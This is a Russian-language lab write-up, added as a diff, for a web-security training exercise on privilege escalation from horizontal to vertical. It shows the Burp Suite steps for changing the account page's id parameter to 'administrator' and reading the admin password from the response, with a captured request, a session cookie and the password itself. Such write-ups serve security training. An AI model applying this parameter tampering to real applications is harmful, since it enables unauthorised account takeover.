@@ -1,0 +1,61 @@
+Horizontal to vertical privilege escalation
+Повышение привилегий от горизонтального к вертикальному
+
+Часто горизонтальную атаку с повышением привилегий можно превратить в вертикальную, скомпрометировав более привилегированного пользователя. Например, горизонтальная эскалация может позволить злоумышленнику сбросить или перехватить пароль, принадлежащий другому пользователю. Если злоумышленник нацеливается на пользователя с правами администратора и скомпрометирует его учетную запись, он может получить административный доступ и, таким образом, выполнить вертикальное повышение привилегий.
+
+Злоумышленник может получить доступ к странице учетной записи другого пользователя, используя уже описанный метод изменения параметров для горизонтального повышения привилегий:
+https://insecure-website.com/myaccount?id=456
+
+Если целевой пользователь является администратором приложения, злоумышленник получит доступ к странице административной учетной записи. На этой странице может быть раскрыт пароль администратора, предоставлены средства его изменения или предоставлен прямой доступ к привилегированным функциям.
+
+В этой лаборатории есть страница учетной записи пользователя, содержащая существующий пароль текущего пользователя, предварительно заполненный в маскированном поле ввода.
+
+Чтобы решить лабораторную работу, найдите пароль администратора, а затем используйте его для удаления пользователя Carlos.
+
+Вы можете войти в свою учетную запись, используя следующие учетные данные: wiener:peter.
+
+Подсказки:
+
+Войдите в систему, используя предоставленные учетные данные, и получите доступ к странице учетной записи пользователя.
+     Измените параметр «id» в URL-адресе на администратора.
+     Просмотрите ответ в Burp и обратите внимание, что он содержит пароль администратора.
+     Войдите в учетную запись администратора и удалите Carlos.
+
+
+Solution:
+1. start burp suite
+2. proxy https://0a5100ef0363a8858586d51c00c700df.web-security-academy.net/
+3. зайти в лк wiener:peter
+4. ищем id - wiener:
+
+GET /my-account?id=wiener HTTP/2
+Host: 0a5100ef0363a8858586d51c00c700df.web-security-academy.net
+Cookie: session=s0Kw054TmPJMSklpDlM7sUO6GfmqqMKP
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Referer: https://0a5100ef0363a8858586d51c00c700df.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+
+5. Repeater :
+Изменить wiener на administrator:
+GET /my-account?id=wiener HTTP/2
+
+в Response:
+                           <label>Password</label>
+                            <input required type="hidden" name="csrf" value="MMReYde89REoSa1NniycfrXCwtpieW2Y">
+                            <input required type=password name=password  value='vum9vqtw9iaqc7b76w1f'/>
+
+
+admin password:
+vum9vqtw9iaqc7b76w1f
